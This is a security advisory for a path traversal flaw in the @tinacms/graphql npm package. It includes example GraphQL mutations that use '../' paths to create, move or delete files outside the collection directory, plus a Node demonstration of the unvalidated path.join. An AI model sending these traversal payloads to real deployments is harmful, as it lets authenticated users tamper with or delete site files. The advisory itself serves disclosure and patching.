# [M] @tinacms/graphql has a Path Traversal issue

## Summary
Severity: Medium
Advisory: GHSA-2238-xc5r-v9hj
CVE: CVE-2026-24125
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-2238-xc5r-v9hj
Type: github-advisory

## Affected
- npm: `@tinacms/graphql` — affected >=0 <2.1.2

## Details
### Description

TinaCMS allows users to create, update, and delete content documents using relative file paths (`relativePath`, `newRelativePath`) via GraphQL mutations. Under certain conditions, these paths are combined with the collection path using `path.join()` without validating that the resolved path remains within the collection root directory.

Because `path.join()` does not prevent directory traversal, paths containing `../` sequences can escape the intended directory boundary.

### Attack Vectors

1. **File Creation**: Create files outside the collection directory
   ```graphql
   createDocument(
     collection: "post"
     relativePath: "../../config/malicious.md"
     params: { post: { title: "malicious" } }
   )
   ```

2. **File Move/Rename**: Move existing files outside the collection
   ```graphql
   updateDocument(
     collection: "post"
     relativePath: "existing.md"
     params: { relativePath: "../../stolen.md" }
   )
   ```

3. **File Deletion**: Delete files outside the collection
   ```graphql
   deleteDocument(
     collection: "post"
     relativePath: "../../important-config.md"
   )
   ```

4. **Folder Creation**: Create folders outside the collection
   ```graphql
   createFolder(
     collection: "post"
     relativePath: "../../malicious-folder"
   )
   ```

## Impact

An authenticated user with document mutation permissions can:

- **Create content files** outside collection boundaries (subject to schema validation)
- **Move or rename files** outside collection boundaries
- **Delete content files** outside collection boundaries
- **Read file contents** via document retrieval mutations

## Mitigating Factors

Several constraints limit the practical impact of this vulnerability:

1. **Schema Validation**: Created/updated content must conform to the collection's GraphQL schema. Attackers cannot write arbitrary file content—the `params` argument is validated against the generated mutation types (e.g., `PostMutation`).

2. **Authentication Required**: Exploitation requires authenticated access with CMS editor permissions. Anonymous users cannot access GraphQL mutations.

3. **Git Tracking**: In typical deployments, all file operations are tracked in git (either via GitHub API for Tina Cloud/self-hosted with GitProvider, or local filesystem changes). Malicious changes are visible in version control and can be reverted.

### What This Vulnerability Does NOT Allow

- Writing arbitrary file content (content is schema-validated)
- Silent/untracked file modifications (changes appear in git)
- Unauthenticated access

## Proof of Concept

See `packages/@tinacms/graphql/tests/path-traversal-security/index.test.ts` for automated tests demonstrating the vulnerability.

Manual reproduction:
```bash
node -e "
const path = require('path');

const collectionPath = 'content/posts';
const maliciousRelativePath = '../../OUTSIDE/poc.md';

const realPath = path.join(collectionPath, maliciousRelativePath);
console.log('Resolved path:', realPath);
// Output: OUTSIDE/poc.md (escaped content/posts)
"
```

## References
- https://github.com/tinacms/tinacms/security/advisories/GHSA-2238-xc5r-v9hj
- https://nvd.nist.gov/vuln/detail/CVE-2026-24125
- https://github.com/tinacms/tinacms
